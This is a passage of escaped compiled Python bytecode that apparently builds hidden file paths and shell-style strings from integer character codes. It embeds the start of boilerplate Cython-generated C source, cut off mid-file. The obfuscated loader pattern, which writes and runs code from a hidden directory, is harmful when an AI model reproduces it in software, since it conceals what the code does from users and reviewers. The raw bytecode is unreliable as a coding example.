0\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\nz\000\000\000\002\000e\002g\000d\010\242\001""\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\013z\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\017d\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\tZ\020\002\000e\002g\000d\n\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000Z\021\002\000e\002d\006g\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\240\022\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000e\001j\023\000\000\000\000\000\000\000\000\240\024\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\002\000e\002d\013g\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\000\031\000\000\000\000\000\000\000\000\000\240\024\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\002\000e\002d\006g\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\001d\014\205\002\031\000\000\000\000\000\000\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z\025\002\000e\002g\000d\r\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000""\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000e\007z\000\000\000\002\000e\002g\000d\016\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\025z\000\000\000\002\000e\002g\000d\017\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\005z\000\000\000\002\000e\002d\013g\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\021z\000\000\000\002\000e\002g\000d\020\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\007z\000\000\000\002\000e\002g\000d\021\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\025z\000\000\000Z\026\002\000e\027e\021\002\000e\002d\022g\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\246\002\000\000\253\002\000\000\000\000\000\000\000\0005\000Z\030e\030\240\031\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000e\020\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\001d\001d\001\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000n\013#\0001\000s\004w\002x""\003Y\000w\001\001\000Y\000\001\000\001\000\002\000e\000j\032\000\000\000\000\000\000\000\000e\000j\014\000\000\000\000\000\000\000\000\240\033\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000e\005\246\001\000\000\253\001\000\000\000\000\000\000\000\000d\023\254\024\246\002\000\000\253\002\000\000\000\000\000\000\000\000\001\000\002\000e\000j\016\000\000\000\000\000\000\000\000e\010\002\000e\002g\000d\010\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\nz\000\000\000\002\000e\002g\000d\010\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\026z\000\000\000\002\000e\002g\000d\010\242\001\246\001\000\000\253\001\000\000\000\000\000\000\000\000\240\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000z\000\000\000e\013z\000\000\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\000j\034\000\000\000\000\000\000\000\000e\021\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\001S\000)\025\351\000\000\000\000N)\t\351\330\000\000\000\351\250\000\000\000r\002\000\000\000\351\256\000\000\000\351 \000\000\000\351\360\000\000\000\351\237\000\000\000\351\221\000\000\000\351\200\000\000\000)\035\351.\000\000\000\351P\000\000\000\351Y\000\000\000\351_\000\000\000r\013\000\000\000\351R\000\000\000\351I\000\000\000\351V\000\000\000\351A\000\000\000\351T\000\000\000\351E\000\000\000\351/\000\000\000\3512\000\000\000\3510\000\000\000r\025\000\000\000\3515\000\000\000r\026\000\000\000\3519\000\000\000r\026\000\000\000r\025\000\000\000r\026\000\000\000r\030\000\000\000r\025\000\000\000r\030""\000\000\000r\026\000\000\000\3518\000\000\000r\031\000\000\000r\027\000\000\000\3514\000\000\000)\022\351e\000\000\000\351x\000\000\000\351p\000\000\000\351o\000\000\000\351r\000\000\000\351t\000\000\000r\005\000\000\000r\013\000\000\000r\014\000\000\000r\022\000\000\000\351H\000\000\000\351O\000\000\000\351N\000\000\000r!\000\000\000r\"\000\000\000\351M\000\000\000r\023\000\000\000\351=\000\000\000)\031r\033\000\000\000r\034\000\000\000r\035\000\000\000r\036\000\000\000r\037\000\000\000r \000\000\000r\005\000\000\000r\013\000\000\000r\014\000\000\000r\022\000\000\000r!\000\000\000r\"\000\000\000r#\000\000\000r\r\000\000\000r\023\000\000\000\351X\000\000\000r\023\000\000\000\351C\000\000\000\351U\000\000\000r\022\000\000\000r\021\000\000\000\351B\000\000\000\351L\000\000\000r\023\000\000\000r%\000\000\000r\n\000\000\000r\024\000\000\000)\004r\005\000\000\000\351&\000\000\000r+\000\000\000r\005\000\000\000a\022\212\003\000#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif /* PY_SSIZE_T_CLEAN */\n#include \"Python.h\"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\n    #error Cython requires Python 2.6+ or Python 3.3+.\n#else\n#define CYTHON_ABI \"0_29_33\"\n#define CYTHON_HEX_VERSION 0x001D21F0\n#define CYTHON_FUTURE_DIVISION 1\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #if PY_VERSION_HEX >= 0x02070000\n    #define HAVE_LONG_LONG\n  #endif\n#endif""\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#ifdef PYPY_VERSION\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PYSTON_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTY""PE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_ASYNC_SLOTS\n  #define CYTHON_USE_ASYNC_SLOTS 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PY_NOGIL)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 1\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #ifndef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID""_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n#else\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 1\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYTYPE_LOOKUP\n    #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\n  #endif\n  #if PY_MAJOR_VERSION < 3\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYLONG_INTERNALS\n    #define CYTHON_USE_PYLONG_INTERNALS 0\n  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)\n    #define CYTHON_USE_PYLONG_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\n    #define CYTHON_USE_PYLIST_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2\n    #undef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\n    #define CYTHON_USE_UNICODE_WRITER 1\n  #endif\n  #ifndef CYTH""ON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #if PY_VERSION_HEX >= 0x030B00A4\n    #undef CYTHON_FAST_THREAD_STATE\n    #define CYTHON_FAST_THREAD_STATE 0\n  #elif !defined(CYTHON_FAST_THREAD_STATE)\n    #define CYTHON_FAST_THREAD_STATE 1\n  #endif\n  #ifndef CYTHON_FAST_PYCALL\n    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)\n  #endif\n  #ifndef CYTHON_USE_DICT_VERSIONS\n    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)\n  #endif\n  #if PY_VERSION_HEX >= 0x030B00A4\n    #undef CYTHON_USE_EXC_INFO_STACK\n    #define CYTHON_USE_EXC_INFO_STACK 0\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\n    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)\n  #endif\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\n  #endif\n#endif\n#if !defined(CYTHON_FAST_PYCCALL)\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\n#endif\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_MAJOR_VERSION < 3\n    #include \"longintrepr.h\"\n  #endif\n  #undef SHIFT\n  #undef BASE\n  #undef MASK\n  #ifdef SIZEOF_VOID_P\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\n  #endif\n#endif\n#ifndef __has_attribute\n  #define __has_attribute(x) 0\n#endif\n#ifndef __has_cpp_attribute\n  #define __has_cpp_attribute(x) 0\n#endif\n#ifndef CYTHON_RESTRICT\n  #if defined(__GNUC__)\n    #define CYTHON_RESTRICT __restrict__\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\n    #define CYTHON_RESTRICT __restrict\n  #elif defined (__STDC_VERSION__)"" && __STDC_VERSION__ >= 199901L\n    #define CYTHON_RESTRICT restrict\n  #else\n    #define CYTHON_RESTRICT\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n# if defined(__GNUC__)\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\n#   else\n#     define CYTHON_UNUSED\n#   endif\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\n# else\n#   define CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_MAYBE_UNUSED_VAR\n#  if defined(__cplusplus)\n     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }\n#  else\n#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)\n#  endif\n#endif\n#ifndef CYTHON_NCP_UNUSED\n# if CYTHON_COMPILING_IN_CPYTHON\n#  define CYTHON_NCP_UNUSED\n# else\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\n# endif\n#endif\n#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\n#ifdef _MSC_VER\n    #ifndef _MSC_STDINT_H_\n        #if _MSC_VER < 1300\n           typedef unsigned char     uint8_t;\n           typedef unsigned int      uint32_t;\n        #else\n           typedef unsigned __int8   uint8_t;\n           typedef unsigned __int32  uint32_t;\n        #endif\n    #endif\n#else\n   #include <stdint.h>\n#endif\n#ifndef CYTHON_FALLTHROUGH\n  #if defined(__cplusplus) && __cplusplus >= 201103L\n    #if __has_cpp_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH [[fallthrough]]\n    #elif __has_cpp_attribute(clang::fallthrough)\n      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\n    #elif __has_cpp_attribute(gnu::fallthrough)\n      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\n    #endif\n  #endif\n  #ifndef CYTHON_FALLTHROUGH\n    #if __has_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\n    #else\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n  #if defined(__clang__ ) && defined(""__apple_build_version__)\n    #if __apple_build_version__ < 7000000\n      #undef  CYTHON_FALLTHROUGH\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n#endif\n\n#ifndef CYTHON_INLINE\n  #if defined(__clang__)\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\n  #elif defined(__GNUC__)\n    #define CYTHON_INLINE __inline__\n  #elif defined(_MSC_VER)\n    #define CYTHON_INLINE __inline\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_INLINE inline\n  #else\n    #define CYTHON_INLINE\n  #endif\n#endif\n\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)\n  #define Py_OptimizeFlag 0\n#endif\n#define __PYX_BUILD_PY_SSIZE_T \"n\"\n#define CYTHON_FORMAT_SSIZE_T \"z\"\n#if PY_MAJOR_VERSION < 3\n  #define __Pyx_BUILTIN_MODULE_NAME \"__builtin__\"\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n  #define __Pyx_DefaultClassType PyClass_Type\n#else\n  #define __Pyx_BUILTIN_MODULE_NAME \"builtins\"\n  #define __Pyx_DefaultClassType PyType_Type\n#if PY_VERSION_HEX >= 0x030B00A1\n    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\n                                                    PyObject *name, int fline, PyObject *lnos) {\n        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;\n        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;\n        const char *fn_cstr=NULL;\n        const char *name_cstr=NULL;\n        PyCodeObject* co=NULL;\n        PyObject *type, *value, *traceback;\n        PyErr_Fetch(&type, &value, &traceba""ck);\n        if (!(kwds=PyDict_New())) goto end;\n        if (!(argcount=PyLong_FromLong(a))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_argcount\", argcount) != 0) goto end;\n        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_posonlyargcount\", posonlyargcount) != 0) goto end;\n        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_kwonlyargcount\", kwonlyargcount) != 0) goto end;\n        if (!(nlocals=PyLong_FromLong(l))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_nlocals\", nlocals) != 0) goto end;\n        if (!(stacksize=PyLong_FromLong(s))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_stacksize\", stacksize) != 0) goto end;\n        if (!(flags=PyLong_FromLong(f))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_flags\", flags) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_code\", code) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_consts\", c) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_names\", n) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_varnames\", v) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_freevars\", fv) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_cellvars\", cell) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_linetable\", lnos) != 0) goto end;\n        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;\n        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;\n        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;\n        if (!(replace = PyObject_GetAttrString((PyObject*)co, \"replace\"))) goto cleanup_code_too;\n        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here\n        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;\n        Py_XDECREF((PyObject*)""co);\n        co = (PyCodeObject*)call_result;\n        call_result = NULL;\n        if (0) {\n            cleanup_code_too:\n            Py_XDECREF((PyObject*)co);\n            co = NULL;\n        }\n        end:\n        Py_XDECREF(kwds);\n        Py_XDECREF(argcount);\n        Py_XDECREF(posonlyargcount);\n        Py_XDECREF(kwonlyargcount);\n        Py_XDECREF(nlocals);\n        Py_XDECREF(stacksize);\n        Py_XDECREF(replace);\n        Py_XDECREF(call_result);\n        Py_XDECREF(empty);\n        if (type) {\n            PyErr_Restore(type, value, traceback);\n        }\n        return co;\n    }\n#else\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#endif\n  #define __Pyx_DefaultClassType PyType_Type\n#endif\n#ifndef Py_TPFLAGS_CHECKTYPES\n  #define Py_TPFLAGS_CHECKTYPES 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_INDEX\n  #define Py_TPFLAGS_HAVE_INDEX 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\n#endif\n#ifndef METH_STACKLESS\n  #define METH_STACKLESS 0\n#endif\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\n  #ifndef METH_FASTCALL\n     #define METH_FASTCALL 0x80\n  #endif\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\n                                                          Py_ssize_t nargs, PyObject *kwnames);\n#else\n  #define __Pyx_PyCFunctionFast _PyCFunctionFast\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\n#endif\n#if CYTHON_FAST_PYCCALL\n#define __Pyx_PyFastCFunction_Check(func)\\\n    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_K""EYWORDS | METH_STACKLESS)))))\n#else\n#define __Pyx_PyFastCFunction_Check(func) 0\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\n  #define PyObject_Free(p)     PyMem_Free(p)\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1\n  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)\n  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)\n  #define PyMem_RawFree(p)             PyMem_Free(p)\n#endif\n#if CYTHON_COMPILING_IN_PYSTON\n  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)\n#else\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\n#endif\n#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#elif PY_VERSION_HEX >= 0x03060000\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\n#elif PY_VERSION_HEX >= 0x03000000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#else\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\n#endif\n#if PY_VERSION_HEX < 